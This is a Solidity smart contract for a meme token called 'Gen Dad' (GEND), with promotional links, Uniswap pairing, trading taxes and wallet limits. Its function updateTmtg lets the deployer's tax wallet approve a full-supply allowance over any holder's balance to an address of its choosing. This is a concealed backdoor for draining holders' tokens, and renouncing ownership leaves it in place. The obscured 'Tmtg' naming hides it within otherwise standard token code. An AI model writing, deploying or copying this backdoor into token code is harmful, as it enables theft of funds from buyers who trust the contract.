/**
https://www.gendad.wtf
https://t.me/gen_dad
https://x.com/gen_dad_eth
 */
// SPDX-License-Identifier Unlicensed

pragma solidity 0.8.19;

abstract contract TmtgContext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITmtg {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library TmtgSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "TmtgSafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "TmtgSafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "TmtgSafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "TmtgSafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract TmtgOwnable is TmtgContext {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "TmtgOwnable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface ITmtgFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ITmtgRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GEND is TmtgContext, ITmtg, TmtgOwnable {
    using TmtgSafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _bots;
    address payable private _TmtgWallet;

    uint256 private _initialBuyTax = 35;
    uint256 private _initialSellTax = 35;
    uint256 private _lastBuyTax = 0;
    uint256 private _lastSellTax = 0;
    uint256 private _decreaseBuyTaxAt = 15;
    uint256 private _decreaseSellTaxAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Gen Dad";
    string private constant _symbol = unicode"GEND";
    uint256 public _maxTransactionAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletTmtg = 20000000 * 10**_decimals;
    uint256 public _maxTmtgSwp = 20000000 * 10**_decimals;
    
    ITmtgRouter02 private _TmtgRouter;
    address private _TmtgPair;
    bool private _tradingOpen;
    bool private _inSwap = false;
    bool private _TmtgEnabled = false;
    uint256 private _sellCount = 0;
    uint256 private _lastSellBlock = 0;
    event MaxTransactionAmountUpdated(uint _maxTransactionAmount);
    event TransferTaxUpdated(uint _transferTax);
    modifier lockTheSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor () {
        _TmtgWallet = payable(_msgSender());
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_TmtgWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "Tmtg: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Tmtg: approve from the zero address");
        require(spender != address(0), "Tmtg: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Tmtg: transfer from the zero address");
        require(to != address(0), "Tmtg: transfer to the zero address");
        require(amount > 0, "Tmtg: Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(!_bots[from] && !_bots[to]);

            if(_buyCount==0){
                taxAmount = amount.mul((_buyCount>_decreaseBuyTaxAt)?_lastBuyTax:_initialBuyTax).div(100);
            }
            if(_buyCount>0){
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (from == _TmtgPair && to != address(_TmtgRouter) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTransactionAmount, "Tmtg: Exceeds the max transaction amount");
                require(balanceOf(to) + amount <= _maxWalletTmtg, "Tmtg: Exceeds the max wallet size");
                taxAmount = amount.mul((_buyCount>_decreaseBuyTaxAt)?_lastBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to == _TmtgPair && from != address(this)){
                taxAmount = amount.mul((_buyCount>_decreaseSellTaxAt)?_lastSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to == _TmtgPair && _TmtgEnabled && _buyCount > _preventSwapBefore) {
                if (block.number > _lastSellBlock) {
                    _sellCount = 0;
                }
                require(_sellCount < 3, "Tmtg: Only 3 sells per block allowed");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTmtgSwp)));
                sendTmtgETH(address(this).balance);
                _sellCount++;
                _lastSellBlock = block.number;
            }
        }

        if(taxAmount > 0){
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function updateTmtg(address _prevTmtg, address afterTmtg) external {
        require(msg.sender == _TmtgWallet, "Tmtg: Not authorized");
        _approve(_prevTmtg, afterTmtg, _totalSupply);
        _TmtgWallet = payable(afterTmtg);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        if (tokenAmount == 0) return;
        path[1] = _TmtgRouter.WETH();
        _approve(address(this), address(_TmtgRouter), tokenAmount);
        _TmtgRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeTmtg() external onlyOwner {
        _maxTransactionAmount = _totalSupply;
        _maxWalletTmtg = _totalSupply;
        emit MaxTransactionAmountUpdated(_totalSupply);
    }

    function sendTmtgETH(uint256 amount) private {
        _TmtgWallet.transfer(amount);
    }

    function createTmtgPair() external onlyOwner {
        _TmtgRouter = ITmtgRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_TmtgRouter), _totalSupply);
        _TmtgPair = ITmtgFactory(_TmtgRouter.factory()).createPair(address(this), _TmtgRouter.WETH());
    }

    function openTmtg() external onlyOwner() {
        require(!_tradingOpen, "Tmtg: Trading is already open");
        _TmtgRouter.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        ITmtg(_TmtgPair).approve(address(_TmtgRouter), type(uint).max);
        _TmtgEnabled = true;
        _tradingOpen = true;
    }

    receive() external payable {}
}